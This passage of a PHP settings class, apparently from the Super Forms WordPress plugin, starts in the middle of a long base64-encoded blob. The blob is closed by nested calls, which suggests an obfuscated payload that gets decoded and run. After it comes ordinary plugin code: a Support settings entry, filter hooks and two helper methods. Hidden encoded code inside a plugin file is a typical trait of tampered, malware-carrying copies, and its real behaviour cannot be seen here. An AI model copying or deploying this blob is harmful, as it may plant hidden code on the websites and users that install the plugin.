InIlxIzwuXhbc8bQdYPjWCDztChlt40ClSlSqdl/9LY+6a7SAaxrlgHZGDzQQidhF0PR0YUuuK2jK+wct+zUQlKpdqa3nwAWiPBCAE4HLa8OAOg5pWsEGsq0vK4ZrLRAcLpj/XbqerkSe+ZF0Zvco5K95Yuli5S6/SIM0Z4pZp+ccvpif1YfEE158kWt6oMZFfr9d7iyFfHSm8tW/lifFwrK+dOHQO6t1DoB21UuXfbd5tEaUrWLSi2+rIRQXVxtpKzBJNwBRFiqnUqXhBBIslj9FQwo38D7jbTo15oy06LtJgqau9QpQQDFHWKotkFDKJo8AmvilbDsylZRQ8wVuUYZ9r1hhUi0390c0JvD/b6b5nPdw0w+36tZHSkflQIhp5/H326pVw7VFHtdhjjG3271rCpIJi03Tv8t3pbC/3KbrUPerxD2UF2snS0K1AN8eK0z3tBVE99N7nnAEEX5fqcQyeSDvyhEpoiUAOM1crbWZb4Er9Ve1pR0fxv/y5QT9B5/nDiFoiqza/bL0UD1iZs3lypz1ei50sVPNGunFE88BqpWOY5WZlcfkJj/HE+q/RSTumGQsTU0Rjs+etUYtacsJ6ltTNNs8LuBTEvaz9Puml1wtvBQTEOtoqSNDdKhdW4Kp51L0SHbEKx9Xdms65tPuVndf5TEyHol/BwugdidaohayjFORlTLOu5+0pfJVtiYQIPWd7IRBgeRHnSAAPLks3h8BHp8RzKnW5x5wCiUloZ1Qz+SIyzfjVMZULVJKCpci4xIxsVsiWvPDAzaIaEAiyCv6Q4TtFhzVYB1lGEGeABDNdfU13gUFHGMiWKBJvhpYwJC1aIquxklhBCzqDrJ4vst6MkcwhoHHnAjx7M/ZB/wI5jtQjyuQDrQEsx0sEJlY9tx1AirvUODF5VRtlnmGZx8gKbICSFL3rHPiK5C01zxVQMtPbSpx80hRMC0wbQZ4xxHzKqgzzJpTtRMi5tUdTHsNp6Y2BC3cntMf/lHtIfLh1RLfWWEMCrnjwrVZ5tNxZZ+ppM/lR5fQrpryd0l+Fi7B9mH7ZnCQDVLF6fbDTXTGymqowYa3Sj+y72JWSnriua0qeiMnc9hMsBF+81EmjCQjQn8YyGM2FZNcpEXgfAnjYhFbxydu2hAa5c3HHMVMr3z72LS47tJnezcas6EEqiAM0reCfxKZuWv1JIPkdPO93SB/DENC42SsKXxtpLiqCsIYpXQmFco0wDfY80byipdZXgFFPoUVswxkd6tBR9DlHBfe0aL1wvlbdzMqwiz/kQqnwLhhz/IZ9UXMCrrDb2l+Fl2eX+0qmiF54Y6cmmUPLv0SF3oU8ULQ8fi6K1ya/8BMG+fOMU1uM7CqaVxiBbvw8pMkb2WEUwfrX4p/hegjkT3sxsbpGvD24mH7awnpb4gcKhEvrc4bvByHq7zxFsYbhuqGLA3vTbJ7zYnNE+PtpGU7GzTN5FtEaRjekUddPXPH1upREhaptk5pwcPgv7FVE0LrBykeWFlPcTCrI7vved5rjAjt9sBH8EUD3epQcmRUviaH7HaCMD916VtIGuZzqTSQeiI/GvVOc1esZTX74/3jRB/NJRGFLj+roKQJ90JX3j9fnPOtfpP8nDXw2tP98GE/+Brf/77/v53/8D')))));


        /** 
         *	Support
         *
         *	@since		1.0.0
        */
        $array['support'] = array(        
            'hidden' => true,
            'name' => __( 'Support', 'super-forms' ),
            'label' => __( 'Support', 'super-forms' ),
            'html' => array(
                '<p>For support please contact us through Envato: <a href="http://codecanyon.net/user/feeling4design">feeling4design</a></p>',
            ),
        );
        $array = apply_filters( 'super_settings_after_support_filter', $array, array( 'settings'=>$settings ) );

        
        $array = apply_filters( 'super_settings_end_filter', $array, array( 'settings'=>$settings ) );
        
        return $array;
        
    }

    /**
     * Retrieve the default value of the field
     * @param  string $name
     * @param  array $settings
     * @param  string $default
     *
     *	@since		1.0.0
    */
    public static function get_value( $strict_default, $name, $settings, $default ) {
        if( $strict_default==1 ) {
            return $default;
        }else{
            return ( !isset( $settings[$name] ) ? $default : $settings[$name] );
        }
    }
    
    /**
     * Reformat the settings
     * @param  array $settings
     *
     *	@since		1.0.0
    */
    public static function format_settings( $settings=null ) {
        if($settings!=false){
            foreach($settings as $k=>$v) {
                $settings[$k] = stripslashes($v);
            }
        }
        return $settings;
    }
    
}
endif;